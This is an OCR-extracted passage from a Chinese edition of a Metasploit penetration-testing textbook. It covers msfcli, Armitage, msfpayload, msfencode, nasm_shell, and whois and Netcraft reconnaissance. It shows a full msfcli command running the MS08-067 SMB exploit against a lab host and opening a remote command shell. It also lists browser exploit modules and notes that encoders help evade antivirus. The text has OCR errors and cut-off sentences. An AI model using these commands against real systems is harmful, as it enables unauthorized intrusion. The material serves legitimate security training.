Current Setting
RequiredDescription
RHOST
0.0.0.0
yes
The target address
RPORT
445
yes
Set the SMB service port
SMBPIPEBROWSER
yes
The pipe name to use (BROWSER, SRVSVC)
你就可以看到这个模块需要三个配置选项：RHOST、RPORT和SMPIPE。现在，加上一个
字符“P”，你就可以来检查可用的攻击载荷。
10
---
## Page 38
第2章Metasploit基础
msfc1i windows/smb/ms08_067_netapi RH0ST=192.168.1.155 P
wait while we load the module tree...
Compatiblepayloads
Name
Description
generic/debug_trap
Generatea debugtrapinthe targetprocess
generic/shell_bind_tcp
Listenfor a connection and spawna command shell
在为我们的渗透攻击设置完成所有必需的配置选项，并选择了-个攻击载荷之后，我们就
可以通过在msfcli的命令参数字符串最后加上字符“E”，来运行渗透测试代码，如下所示：
root@bt:/# msfcli windows/smb/ms08_067_netapi RHOST=192.168.1.155 PAYLOAD=windows/shel1/bind_tcp E
[*] Please wait while we load the module tree...
[*]Startedbind handler
[*]Automatically detecting thetarget...
[*]Fingerprint:WindowsXPService Pack2-lang:English
[*]Selected Target:Windows XPSP2 English(NX)
[*]Triggering the vulnerability...
[*]Sending stage(240 bytes)
[*] Command shell session 1 opened (192.168.1.101:46025 -> 192.168.1.155:4444)
Microsoft Windows XP[Version 5.1.2600]
(C)Copyright 1985-2001 Microsoft Corp.
C:\WINDOWS\system32>
我们成功了！因为我们已经从远程系统上拿到了一个Windows命令行的shell。
2.2.3 Armitage
Metasploit框架中的armitage组件是一个完全交互式的图形化用户接口，由RaphaelMudge
所开发。这个接口具有丰富的功能，并且是免费的，让人印象深刻。我们在本书中不会深入讲
述覆盖armitage的使用，但它确实值得读者们自己去探索。我们的目标是讲解和分析Metasploit
的输入和输出，而一旦你了解了Metasploit框架的实际工作原理，那么这个图形界面工具对你
而言将是小菜一碟。
●运行 Armitage
你可以通过执行 armitage 命令来启动 armitage。在启动过程中，选择“Start MSF”，这样
就可以让armitage连接到你的Metasploit实例上。
root@bt:/opt/framework3/msf3#armitage
armitage启动之后，简单地点击菜单项就可以执行特定的渗透攻击，或来访问其他的
Metasploit功能，举例来说，图2-1显示了进行浏览器（客户端）渗透攻击的过程。
11
---
## Page 39
Metasploit渗透测试指南
Armitag
HOsts
AttagksWorkspaces Help
FindAttacks
Browser Attack
bsd
dialup
Evil Eiles
adobe_cooltype_sing
Browser Aut
hpux
aim_goaway
Eile Autopwr
aolicq_downloadagent
KiewleH
multi
awingsoft_winds3d_sceneur
chilkat_crypt_writefile
communicrypt_mail_activex
dxstudio_player_exe
enjoysapgui_comp_do
ie_createobject
undusaesun
java_basicservice_imp
java_codebase_trust
java_docbase_bof
java_ws_arginject_altivm
macrovision_unsafe
ms06_001_wmf_setabortproc
ms07_017_ani_loadimage_chu
ms08041_snapshotvewer
ms10_022_je_vbscript_winhlp32
223payloads
aceders
ms10_042_helpctr_xss_cmd_exec
=1svnr12883 updated today （2011.06.08)
ms10_046_shortcuticon_dlloader
novelliprint_datetime
novelliprint_target_frame
persits_xupload_traversal
symantec_altirisdeployment_
symantec_appstream_unsafe
tumbleweed_fletransfer
winamp_playlist_unc
wmi_admintools
图2-1armitage的浏览器渗透攻击菜单项
2.3Metasploit功能程序
在为你引见了Metasploit的三个主要用户接口之后，现在可以来介绍一些Metasploit功能程
序了。Metasploit的功能程序是在某些特定的场合下，对Metasploit框架中的一些特殊功能进行
功能程序，并在书中其他章节中来引出其他的功能程序。
2.3.1MSF攻击载荷生成器
MSF攻击载荷生成器允许你能够生成shellcode、可执行代码和其他更多的东西，也可以让
它们在框架软件之外的渗透代码中进行使用。
格式，每种输出格式在不同的场景中使用。比如，你在使用Python语言编写一个渗透攻击的概
念验证代码（POC：Proofofconcept），那么C语言格式的输出是最好的：如果你在编写-一个浏
览器渗透攻击代码，那么以JavaScript语言方式输出的shellcode将是最适合的，在你选择了所
期望的输出之后，你可以简单地将这个攻击载荷直接加入到一个HTML文件中来触发渗透攻击。
12
---
## Page 40
第2章Metasploit基础
让我们来看一下这个功能程序需要哪些配置选项，在命令行中输入msfpayload-h，如下所示：
root@bt:/#msfpayload-h
加一个字符“O”，就可以列出所必需和可选的选项列表，如下：
root@bt:/#msfpayloadwindows/shell_reverse_tcp0
成器。
2.3.2MSF编码器
由MSF攻击载荷生成器产生的shellcode是完全可运行的，但是其中包含了一些null空字
符，在一些程序进行解析时，这些空字符会被认为是字符串的结束，从而使得代码在完整执行
之前被截断而终止运行。简单来说，这些x00和xff字符会破坏你的攻击载荷。
另外，在网络上明文传输的shellcode很可能被入侵检测系统和杀毒软件所识别，为了解决
这一问题，Metasploit的开发者们提供了MSF编码器，可以帮助你通过对原始攻击载荷进行编
编码器的配置选项列表。
来构造攻击载荷时非常有用，而这种场景往往会出现在很多文件格式的渗透攻击，或者其他应
现得很好。
在遭遇麻烦的时候，你可能需要求助于最强大的x86/shikata_ga_nai编码器，在Metasploit
评价的。对于编码器，一个Excellent的评价代表着它的应用面最广，并且较其他编码器可以容
纳更大程度的代码微调。如果需要查看有哪些可用的编码器清单，你可以使用msfencode的-1
参数，编码器将以可靠性的好坏进行排序显示。
root@bt:~#msfencode-1
2.3.3NasmShell
nasm_shell.rb功能程序在你尝试了解汇编代码含义时是个非常有用的手头工具，特别是当
你进行渗透代码开发时，你需要对给定的汇编命令找出它的opcode操作码，那你就可以使用这
个功能程序来帮助你。
13
---
## Page 41
Metasploit渗透测试指南
比如，当我们运行这个工具，并请求jmp esp 命令的 opcode 操作码时，nasm_shell将会告
诉我们是FFE4。
root@bt:/opt/framework3/msf3/tools#./nasm_shell.rb
dsa duwhois secmaniac.net
[*]exec:whois secmaniac.net
·.SNIP.··
Registered through: GoDaddy.com， Inc.(http://www.godaddy.com)
Domain Name: SECMANIAC.NET
Created on:03-Feb-10
Expires on:03-Feb-12
Last Updated on:03-Feb-10
ODomainserversinlistedorder:
NS57.DOMAINCONTROL.COM
NS58.DOMAINCONTROL.COM
在O处我们发现域名（DNS）服务器由DOMAINCONTROL.COM提供，这是关于不能攻击
未授权系统的典型例子。在一些大的机构中，DNS服务器往往部署在公司内部，可以被作为攻
击点。使用针对DNS服务器的区域传送攻击以及其他类似的攻击，攻击者通常能够揭露出一个
网络内部及外部的很多信息。但在这个场景中，DOMAINCONTROL.COM并不归secmaniac.net
所有，所以我们不能对这些域名服务器进行攻击，应当转移到其他的攻击点上。
3.1.2Netcraft
Netcraf（http://searchdns.netcraft.com/）是一个网页界面的工具，使用它我们能够发现承载
某个特定网站的服务器IP地址，如图3-1所示。
Site
Lastreboot
unknownuptme graph
secmaniac.com
WIDEOPENWESTOHIO
75.118.185.142
Slterank
52103
us
Na
wd-ous
July 2009
PI:EMAIL
no-p.com
Reverse DNS
d118-75-142-185.rywide
Reno, 89511, Un
lor